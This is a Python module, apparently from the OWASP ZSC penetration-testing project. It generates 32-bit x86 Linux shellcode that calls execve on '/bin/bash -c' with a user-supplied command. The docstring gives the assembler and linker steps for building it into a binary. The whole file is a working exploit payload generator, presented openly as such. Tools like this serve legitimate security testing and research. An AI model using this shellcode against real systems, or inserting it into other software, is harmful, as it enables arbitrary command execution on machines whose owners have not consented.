"""
OWASP ZSC
# Status: Tested the module for ASM compile. ASM code is good
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]

shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.php
# COMPILE:
1. `as <file.asm> --32 -o <out.o>`. --32 is to compile 32bit binary
2. `ld -m elf_i386 -o <out_binary> <out.o>` "-m elf_i386" is to compile i386 arch binary. Can use -s to strip
"""
from owasp_zsc.new_cores import stack
from owasp_zsc.new_cores import base_module
from owasp_zsc.new_cores import alert


class Module(base_module.BasePayload):
    command = base_module.OptString("", "Command to execute")

    def generate(self):
        payload = "push $0xb\n"
        payload += "pop %eax\n"
        payload += "cltd\n"
        payload += "push %edx\n"
        payload += stack.generate(self.command, '%ecx', 'string')
        payload += "mov %esp, %esi\n"
        payload += "push %edx\n"
        payload += "push $0x632d9090\n"
        payload += "pop %ecx\n"
        payload += "shr $0x10, %ecx\n"
        payload += "push %ecx\n"
        payload += "mov %esp, %ecx\n"
        payload += "push %edx\n"
        payload += "push $0x68\n"
        payload += "push $0x7361622f\n"
        payload += "push $0x6e69622f\n"
        payload += "mov %esp, %ebx\n"
        payload += "push %edx\n"
        payload += "push %edi\n"
        payload += "push %esi\n"
        payload += "push %ecx\n"
        payload += "push %ebx\n"
        payload += "mov %esp, %ecx\n"
        payload += "int $0x80"
        return payload

    def run(self):
        if not self.command:
            alert.error("A command is required.")
            return
        self.handle_generate(__name__)

